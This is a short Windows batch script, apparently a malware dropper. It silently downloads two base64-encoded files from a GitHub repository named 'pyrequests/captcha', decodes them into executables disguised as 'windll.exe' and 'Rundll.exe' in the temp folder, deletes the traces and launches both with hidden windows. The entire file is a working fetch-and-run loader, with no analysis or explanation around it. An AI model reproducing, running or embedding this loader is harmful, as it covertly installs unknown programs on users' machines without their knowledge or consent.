@echo off
setlocal enabledelayedexpansion

:: Configuration Section
set "url1=https://raw.githubusercontent.com/pyrequests/captcha/refs/heads/main/xc.txt"
set "url2=https://raw.githubusercontent.com/pyrequests/captcha/refs/heads/main/tgr.txt"

set "ext1=exe"
set "ext2=exe"

set "outputDir=%temp%\base64_files"
if not exist "%outputDir%" mkdir "%outputDir%"

set "outputFile1=%outputDir%\windll.!ext1!"
set "outputFile2=%outputDir%\Rundll.!ext2!"

:: Download and decode first file (hidden)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%url1%' -OutFile '%outputDir%\temp1.txt'"
powershell -WindowStyle Hidden -Command "$b64 = Get-Content '%outputDir%\temp1.txt' -Raw; [IO.File]::WriteAllBytes('%outputFile1%', [Convert]::FromBase64String($b64))"

:: Download and decode second file (hidden)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%url2%' -OutFile '%outputDir%\temp2.txt'"
powershell -WindowStyle Hidden -Command "$b64 = Get-Content '%outputDir%\temp2.txt' -Raw; [IO.File]::WriteAllBytes('%outputFile2%', [Convert]::FromBase64String($b64))"

:: Cleanup temp files
del "%outputDir%\temp1.txt" 2>nul
del "%outputDir%\temp2.txt" 2>nul

:: Execute files completely hidden
powershell -WindowStyle Hidden -Command "Start-Process '%outputFile1%' -WindowStyle Hidden"
powershell -WindowStyle Hidden -Command "Start-Process '%outputFile2%' -WindowStyle Hidden"

exit
